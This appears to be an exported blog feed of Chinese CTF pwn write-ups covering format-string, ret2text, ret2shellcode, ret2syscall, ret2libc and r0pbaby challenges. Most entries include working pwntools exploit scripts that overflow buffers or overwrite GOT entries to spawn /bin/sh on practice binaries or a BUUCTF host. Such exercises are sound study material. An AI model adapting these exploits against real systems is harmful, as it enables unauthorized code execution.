language-python" data-language="python"><code class="language-python">  from pwn import *   context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./pwn")  local = 0if local:      r = process("./pwn")else:      r = remote("node4.buuoj.cn",27278)  unk_addr =  0x0804C044   payload = p32(unk_addr)+b"%10$n"r.sendline(payload)  r.sendline(str(0x04))#unk_addr = 4byte r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>exp2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./pwn")local = 0if local:    r = process("./pwn")else:    r = remote("node4.buuoj.cn",27278)# 0x804c000  0x804d000 rw-p  # unk_804C044  0x0804C044system_plt = 0x08049080atoi_got = 0x0804C034#payload = b'%10$n' + p32(atoi_got)+p32(system_plt)payload = fmtstr_payload(10,{atoi_got:system_plt})r.sendline(payload)r.sendline("/bin/sh\x00")r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>fmtstr_payload()函数</strong></p><p><a href="https://breeze-666.github.io/2022/01/14/noname/">见博客之随笔</a></p></li><li><p>exp3</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import * context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./pwn")local = 0if local:    r = process("./pwn")else:    r = remote("node4.buuoj.cn",27278)unk_addr =  0x0804C044 payload = fmtstr_payload(10,{unk_addr:0x1})r.sendline(payload)r.sendline(str(0x1))r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc3</title>
      <link href="/2022/01/12/ret2libc3/"/>
      <url>/2022/01/12/ret2libc3/</url>
      
        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/12/ret2libc3/checksec.png" alt="image-20220112081658716" style="zoom:80%;"></li><li><p>run</p><img src="/2022/01/12/ret2libc3/run.png" alt="image-20220112081802038" style="zoom:80%;"></li><li><p>ida</p><p>基本利用思路</p><ul><li>泄露_libc_start_main地址</li><li>获取libc版本</li><li>获取system地址与/bin/sh地址</li><li>再次执行源程序</li><li>触发栈溢出执行system(‘/bin/sh’)</li></ul></li><li><p>exp</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc2</title>
      <link href="/2022/01/12/ret2libc2/"/>
      <url>/2022/01/12/ret2libc2/</url>
      
        <content type="html"><![CDATA[<ul><li><p>本程序只有system,没有出现”/bin/sh”,需要我们自己来读取字符串,所以需要两个gadgets,第一个控制执行读取字符串,第二个控制执行程序system(“/bin/sh”).</p></li><li><p>首先checksec一下</p><img src="/2022/01/12/ret2libc2/checksec.png" alt="image-20220112074054848" style="zoom:80%;"></li><li><p>然后运行程序</p><img src="/2022/01/12/ret2libc2/run.png" alt="image-20220112074208851" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>有system无bin/sh</p></li><li><p>写exp</p>   <pre class="line-numbers language-none"><code class="language-none">1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc2") 4 local = 1 5   6 if local: 7     r = process("./ret2libc2") 8 else: 9     r = remote("")10 gets_plt = 0x0804846011 system_plt = 0x0804849012 system_addr = 0x0804864113 pop_ebx = 0x0804843d14  15 buf2_addr = 0x0804A08016  17 payload = b'a'*112 +p32(gets_plt)+p32(pop_ebx) + p32(buf2_addr)+ p32(system_    plt)+p32(0) + p32(buf2_addr)18  19 r.sendline(payload)20 r.sendline("/bin/sh")21  22 r.interactive()                                                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc1</title>
      <link href="/2022/01/11/ret2libc1/"/>
      <url>/2022/01/11/ret2libc1/</url>
      
        <content type="html"><![CDATA[<ul><li><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>控制执行libc中的函数,通常是返回至某个函数的具体位置(即函数对应的got表内容).一般情况下,我们会选择执行system(“/bin/sh”),故而此时我们需要知道system函数的地址.</p></li><li><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/11/ret2libc1/checksec.png" alt="image-20220111154452445" style="zoom:80%;"></li><li><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><img src="/2022/01/11/ret2libc1/run.png" alt="image-20220111184726541" style="zoom:80%;"></li><li><h3 id="拖入IDA分析"><a href="#拖入IDA分析" class="headerlink" title="拖入IDA分析"></a>拖入IDA分析</h3><p>可以很容易发现危险函数gets</p><p>通过ALT+T</p><p>可以发现system和bin/sh</p></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"> 1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc1") 4   5 local = 1 6   7 if local: 8     r = process("./ret2libc1") 9 else:10     r = remote("")11 bin_sh = 0x0804872012 system_addr = 0x0804861113 system_plt = 0x0804846014 # payload = b'a'*112 + p32(system_addr) + p32(bin_sh)15 payload = flat(['a'*112,p32(system_plt),'b'*4,p32(bin_sh)])16  17 r.sendline(payload)18  19 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscall</title>
      <link href="/2022/01/11/ret2syscall/"/>
      <url>/2022/01/11/ret2syscall/</url>
      
        <content type="html"><![CDATA[<ul><li><h3 id="原理-控制程序执行系统调用-获取shell"><a href="#原理-控制程序执行系统调用-获取shell" class="headerlink" title="原理:控制程序执行系统调用,获取shell"></a>原理:控制程序执行系统调用,获取shell</h3></li><li><h4 id="首先checksec一下"><a href="#首先checksec一下" class="headerlink" title="首先checksec一下"></a>首先checksec一下</h4><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p>   发现危险函数gets(),明显的栈溢出.</p><p>   找gadgets,使用ROPgadget进行寻找</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><ul><li> bin/sh地址</li></ul><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><ul><li> int 0x80地址                <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></li></ul><p>​           </p><ul><li><p>若使用execve来获取shell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">execve("/bin/sh",NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该程序是32位,需要</p><blockquote><ul><li>系统调用号,即eax为0xb</li><li>第一个参数,即ebx应该指向/bin/sh的地址,其实执行sh的地址也可以</li><li>第二个参数ecx应该为0</li></ul></blockquote></li><li></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2shellcode</title>
      <link href="/2022/01/10/ret2shellcode/"/>
      <url>/2022/01/10/ret2shellcode/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先,checksec一下</p><img src="/2022/01/10/ret2shellcode/checksec.png" alt="image-20220111075622897" style="zoom:80%;"></li></ul><ul><li><p>运行一下</p><img src="/2022/01/10/ret2shellcode/run.png" alt="image-20220111075809324" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>危险函数strncpy()</p><p>strncpy()用来复制字符串的前n个字符,其原型为:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char * strncpy(char *dest,const char *src,size_t n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>strncpy()会将字符串src的前n个字符拷贝到字符串dest.</p><p>strncpy()不会向dest追加标记’\0’.</p><ul><li><p>计算偏移</p><img src="/2022/01/10/ret2shellcode/offset.png" alt="image-20220111082354654" style="zoom:80%;"></li></ul></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2shellcode") 4 local = 1 5 if local: 6     r = process("./ret2shellcode") 7 else: 8     r = remote("") 9  10 buf2 = 0x0804A08011  12 shellcode = asm(shellcraft.sh())13  14 #payload = b'a'*0x6c +b'a'*4 + p32(buf2)15  16 #r.sendline(payload)17 r.sendline(shellcode.ljust(112,'a')+p32(buf2))18 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ljust()作用:</p><p>返回一个原字符串并左对齐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2022/01/10/ret2text/"/>
      <url>/2022/01/10/ret2text/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先checksec</p><img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li><li><p>拖入IDA</p><ul><li><p>发现危险函数</p><img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li></ul></li><li><ul><li><p>发现system和bin/sh</p><img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li></ul></li><li><p>找到s相对于ebp的距离0x6c+4</p><img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li><li><p>编写exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                             2 log_level = 'debug'  3 local = 1  4 if local:  5     r = process("./ret2text")  6 else:  7     r = remote("")  8 elf = ELF("./ret2text")  9   10 s = 0x6c + 4 11 system_addr = 0x0804863A 12   13 payload = b'a'*s+p32(system_addr) 14 r.sendline(payload) 15   16 r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defcon-2015-r0pbaby</title>
      <link href="/2022/01/10/defcon-2015-r0pbaby/"/>
      <url>/2022/01/10/defcon-2015-r0pbaby/</url>
      
        <content type="html"><![CDATA[<ul><li>checksec一下</li></ul><img src="/2022/01/10/defcon-2015-r0pbaby/check.png" alt="check" style="zoom:80%;"><ul><li><p>运行</p><img src="/2022/01/10/defcon-2015-r0pbaby/run.png" alt="image-20220110112717649" style="zoom:80%;"><ul><li>功能1,获取libc基址</li><li>功能2,获得函数地址</li><li>功能3,输入值</li></ul></li></ul><ul><li><p>拖入IDA</p><img src="/2022/01/10/defcon-2015-r0pbaby/memcpy.png" alt="image-20220110115718520" style="zoom:80%;"></li></ul><p>​        发现memcpy()函数:复制内存内容(忽略\0)</p><p>​        memcpy()用来复制内存,其原型为:</p><pre><code>   <pre class="line-numbers language-c" data-language="c"><code class="language-c">void * memcpy(void * dest,const void *src,size_t num);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></code></pre><p>​       memcpy()会复制src所指的内存内容的前num个字节到dest所指的内存地址上.</p><p>​        memcpy()并不关心被复制的数据类型,只是逐字节锝进行复制,这给函数的使用带来了很大的灵活性,可以面向任何数据类型进行复制.</p><p>​       需要注意的是:</p><p>​             dest指针要分配足够的空间,也即大于等于num字节的空间.</p><p>​             dest和src所指的内存空间不能重叠</p><p>​       与strcpy()不同的是,memcpy()会复制完整num个字节,不会因为遇到”\0”而结束.</p><ul><li><p>savedregs是一个IDA关键字,保存的堆栈帧指针函数返回地址</p></li><li><p>找gadget</p><img src="/2022/01/10/defcon-2015-r0pbaby/gadget.png" alt="image-20220110122631262" style="zoom:80%;"><ul><li><p>查看本地libc.so</p><img src="/2022/01/10/defcon-2015-r0pbaby/libc.png" alt="image-20220110123659827" style="zoom:80%;"></li></ul><ul><li>找”bin/sh”</li></ul><img src="/2022/01/10/defcon-2015-r0pbaby/bin_sh.png" alt="image-20220110123435108" style="zoom:80%;"></li></ul><ul><li>构造exp</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
